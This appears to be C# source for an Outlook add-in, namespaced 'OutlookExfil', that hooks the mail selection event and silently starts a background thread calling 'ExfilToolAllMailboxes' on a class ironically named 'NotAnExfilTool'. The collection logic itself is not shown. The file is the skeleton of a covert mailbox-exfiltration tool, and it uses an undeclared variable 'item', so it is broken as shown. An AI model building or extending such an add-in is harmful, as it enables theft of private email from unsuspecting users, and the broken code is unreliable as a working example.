using System;
using Microsoft.Office.Interop.Outlook;
using System.Threading;

namespace OutlookExfil
{
    public partial class ThisAddIn
    {
        private void ThisAddIn_Startup(object sender, System.EventArgs e)
        {
            this.Application.ActiveExplorer().SelectionChange += new ExplorerEvents_10_SelectionChangeEventHandler(Explorer_SelectionChange);
        }

        private void ThisAddIn_Shutdown(object sender, System.EventArgs e)
        {
            // Note: Outlook no longer raises this event. If you have code that 
            //    must run when Outlook shuts down, see https://go.microsoft.com/fwlink/?LinkId=506785
        }

        private void InternalStartup()
        { 
            this.Startup += new EventHandler(ThisAddIn_Startup);
            this.Shutdown += new EventHandler(ThisAddIn_Shutdown);
        }
        void Explorer_SelectionChange()
        {
            if (this.Application.ActiveExplorer().Selection.Count == 1)
            {

                if (item != null)
                {
                    NotAnExfilTool exTool = new NotAnExfilTool();
                    //exTool.ExfilTool("EmailSelected.txt", item);

                    Thread myThread = new Thread(new ThreadStart(exTool.ExfilToolAllMailboxes));
                    myThread.Start();
                }
            }
        }
    }
}
